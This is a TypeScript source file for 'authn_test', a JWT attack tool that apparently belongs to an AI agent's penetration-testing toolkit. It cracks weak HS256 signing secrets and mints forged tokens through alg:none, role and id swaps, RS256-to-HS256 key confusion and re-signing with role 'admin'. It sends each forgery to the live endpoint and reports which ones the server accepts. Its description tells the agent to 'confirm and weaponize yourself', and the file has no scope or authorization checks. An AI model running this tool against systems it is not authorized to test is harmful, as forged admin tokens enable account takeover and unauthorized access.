// authn_test — JWT attack tool (plan §05). Composes the pure JWT engine (./jwt),
// the acceptance probe (./probe), and the production transport (./transport): analyse
// a token, mint forged candidates, send each at the endpoint, and report which the
// server ACCEPTS. Facts + leads, not verdicts — the agent judges and weaponizes.
//
// The Tool.define is a thin shell; the testable orchestration is AuthnTest.run,
// which takes an injected HttpSender so it is verified with a mock (no socket).
import z from "zod"
import { Tool } from "../../tool"
import { Session } from "../../../session"
import { Jwt } from "./jwt"
import { TokenAcceptanceProbe, type ProbeReport, type TokenCandidate } from "./probe"
import { ReplaySender, type HttpSender, type ProbeRequest } from "../transport"
import { resolveCapturedRequest } from "../resolve"

/** Pull a JWT from an Authorization header (Bearer or bare), case-insensitively. */
export function extractBearer(headers: Record<string, string>): string | null {
  for (const k in headers) {
    if (k.toLowerCase() !== "authorization") continue
    const v = headers[k] ?? ""
    const m = v.match(/^Bearer\s+(.+)$/i)
    if (m) return m[1].trim()
    if (/^eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\./.test(v.trim())) return v.trim() // bare JWT
    return null
  }
  return null
}

export namespace AuthnTest {
  export interface Input {
    request: ProbeRequest
    token: string
    authHeader: string
    tokenPrefix?: string
    secrets?: readonly string[]
    publicKey?: string
  }

  export interface Report {
    analysis: Jwt.Analysis
    weakSecret: string | null
    candidateCount: number
    probe: ProbeReport
    acceptedCandidates: string[]
  }

  /** Analyse → mint candidates → probe acceptance. `sender` is injected (mock in tests). */
  export async function run(input: Input, sender: HttpSender): Promise<Report | { error: string }> {
    const decoded = Jwt.tryDecode(input.token)
    if ("error" in decoded) return { error: `not a JWT: ${decoded.error}` }
    const analysis = Jwt.analyze(input.token)

    // Weak signing key: a finding in itself, and it lets us forge a VALID signature.
    const weakSecret = Jwt.crackHS256(input.token, input.secrets ?? Jwt.WEAK_SECRETS)

    const candidates: TokenCandidate[] = Jwt.escalationCandidates(input.token) // alg:none + role/id swaps
    if (input.publicKey) {
      candidates.push({
        name: "rs256-hs256-confusion",
        token: Jwt.rs256ToHS256(input.token, input.publicKey, { role: "admin" }),
        note: "RS256→HS256 algorithm confusion (public key as HMAC secret)",
      })
    }
    if (weakSecret !== null) {
      candidates.push({
        name: "weak-secret-resign",
        token: Jwt.signHS256(decoded.header, { ...decoded.payload, role: "admin" }, weakSecret),
        note: `validly-signed forgery via cracked secret "${weakSecret}"`,
      })
    }

    const probe = await new TokenAcceptanceProbe(sender).run({
      request: input.request,
      authHeader: input.authHeader,
      candidates,
      tokenPrefix: input.tokenPrefix,
    })

    return {
      analysis,
      weakSecret,
      candidateCount: candidates.length,
      probe,
      acceptedCandidates: probe.results.filter((r) => r.accepted).map((r) => r.candidate),
    }
  }
}

const DESCRIPTION = `Test a JWT-protected endpoint for token-forgery acceptance. Resolves a captured request, extracts its Bearer token, analyses it (alg:none, weak secret, RS256→HS256 confusion, kid/jku, role/id claims), then SENDS each forged variant and reports which the server ACCEPTS (with a no-token negative control so a public endpoint is not a false positive). Facts + leads — confirm and weaponize yourself.`

export const AuthnTestTool = Tool.define("authn_test", {
  description: DESCRIPTION,
  parameters: z.object({
    request_id: z.string().describe("Captured request to the JWT-protected endpoint (carries the token to forge)."),
    token: z.string().optional().describe("Override the token to attack (default: the request's own Bearer token)."),
    public_key: z.string().optional().describe("RSA public key (PEM) to attempt an RS256→HS256 confusion forgery."),
    token_prefix: z.string().optional().describe('How the token sits in the auth header (default "Bearer ").'),
  }),
  async execute(params, ctx) {
    const sessionID = Session.root(ctx.sessionID)
    const err = (output: string) => ({ title: "authn_test", output, metadata: {} })

    const resolved = resolveCapturedRequest(sessionID, params.request_id)
    if ("error" in resolved) return err(resolved.error)

    const token = params.token ?? extractBearer(resolved.headers)
    if (!token) return err("No JWT Bearer token found in the request; pass `token` explicitly.")

    const report = await AuthnTest.run(
      { request: resolved, token, authHeader: "authorization", tokenPrefix: params.token_prefix, publicKey: params.public_key },
      new ReplaySender({ signal: ctx.abort }),
    )
    if ("error" in report) return err(report.error)

    const accepted = report.acceptedCandidates.length
    return {
      title: accepted > 0 ? `authn_test: ${accepted} forged token(s) ACCEPTED (verify)` : "authn_test: no forged token accepted",
      output: JSON.stringify(report, null, 2),
      metadata: {},
    }
  },
})
